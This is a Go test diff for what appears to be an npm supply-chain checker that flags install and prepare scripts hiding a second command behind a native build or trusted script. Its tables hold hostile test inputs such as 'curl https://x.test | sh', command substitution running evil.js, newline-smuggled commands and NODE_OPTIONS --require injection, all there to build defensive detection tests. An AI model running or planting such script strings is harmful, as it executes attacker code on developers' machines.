@@ -43,27 +43,82 @@ func TestNodeGypAndPrepareGuards(t *testing.T) {
 		"node-gyp rebuild":                         true,
 		"prebuild-install || node-gyp rebuild":     true,
 		"node-pre-gyp install --fallback-to-build": true,
+		"cmake-js compile -O build --release":      true,
 		"node-gyp rebuild && node evil.js":         false,
+		"node-gyp rebuild $(node evil.js)":         false,
+		"node-gyp rebuild `curl -s http://x/y`":    false,
+		"node-gyp rebuild\nnode evil.js":           false,
+		"node-gyp rebuild\r\nnode evil.js":         false,
+		"node-gyp rebuild > /tmp/x":                false,
+		"node-gyp rebuild ${EVIL}":                 false,
+		"node-gyp rebuild node evil.js":            false,
+		"node-gyp rebuild --x 'a;b'":               false,
+		"node-gyp-build & node evil.js":            false,
 		"":                                         false,
 	} {
-		if got := nodeGyp(collapse(script)); got != want {
+		if got := nodeGyp(script); got != want {
 			t.Errorf("nodeGyp(%q) = %v", script, got)
 		}
 	}
-	old := &core.Meta{Scripts: map[string]string{"build": "tsc", "dev": "node serve.js"}, DevDeps: map[string]string{"rollup": "^4"}}
+	old := &core.Meta{Scripts: map[string]string{"build": "tsc", "dev": "node serve.js", "all": "npm run gen && tsc", "gen": "node gen.js"},
+		DevDeps: map[string]string{"rollup": "^4"}}
+	cur := &core.Meta{Scripts: map[string]string{"build": "tsc", "dev": "node serve.js", "all": "npm run gen && tsc", "gen": "node gen.js"}}
+	changed := &core.Meta{Scripts: map[string]string{"build": "node evil.js", "all": "npm run gen && tsc", "gen": "node evil.js"}}
 	for script, want := range map[string]bool{
-		"husky":                    true,
-		"husky install":            true,
-		"is-ci || husky install":   true,
-		"npm run build":            true,
-		"rollup -c && tsc":         true,
-		"node scripts/postinst.js": false, // node ran before; it runs anything
-		"npm run release":          false,
-		"curl https://x.test | sh": false,
+		"husky":                                true,
+		"husky install":                        true,
+		"is-ci || husky install":               true,
+		"npm run build":                        true,
+		"yarn build":                           true,
+		"npm run all":                          true,
+		"rollup -c && tsc":                     true,
+		"node scripts/postinst.js":             false, // node ran before; it runs anything
+		"npm run release":                      false,
+		"npm build":                            false, // not a script runner in npm
+		"yarn add evil-pkg":                    false,
+		"curl https://x.test | sh":             false,
+		"tsc $(node evil.js)":                  false,
+		"tsc `node evil.js`":                   false,
+		"tsc > /etc/x":                         false,
+		"tsc\nnode evil.js":                    false,
+		"NODE_OPTIONS=--require=./evil.js tsc": false,
+		"HUSKY=0 husky":                        false,
+		"npx NODE_OPTIONS=x tsc":               false,
 	} {
-		if got := benignPrepare(script, old); got != want {
+		if got := benignPrepare(script, old, cur); got != want {
 			t.Errorf("benignPrepare(%q) = %v, want %v", script, got, want)
 		}
+	}
+	// The build script's text changed in the candidate: running it is no
+	// longer what the installed version trusted, nor is an unchanged
+	// script that runs a changed one.
+	for _, script := range []string{"npm run build", "yarn build", "npm run all"} {
+		if benignPrepare(script, old, changed) {
+			t.Errorf("benignPrepare(%q) with changed scripts = true", script)
+		}
+	}
+}
+
+// TestNativeBuildBypass covers the shapes that once hid a second command
+// behind an unchanged native build.
+func TestNativeBuildBypass(t *testing.T) {
+	for _, nv := range []string{
+		"node-gyp rebuild $(node evil.js)",
+		"node-gyp rebuild `curl -s http://x/y`",
+		"node-gyp rebuild\nnode evil.js",
+	} {
+		s := subject(core.NPM)
+		s.Old.Scripts = map[string]string{"install": "node-gyp rebuild"}
+		s.New.Scripts = map[string]string{"install": nv}
+		if got := changedInstallScripts(s); len(got) != 1 || got[0] != "install" {
+			t.Errorf("changedInstallScripts(%q) = %q", nv, got)
+		}
+	}
+	s := subject(core.NPM)
+	s.Old.Scripts = map[string]string{"install": "node-gyp rebuild"}
+	s.New.Scripts = map[string]string{"install": "prebuild-install --runtime napi || node-gyp rebuild --release"}
+	if got := changedInstallScripts(s); len(got) != 0 {
+		t.Errorf("a native build swap fired: %q", got)
 	}
 }
 
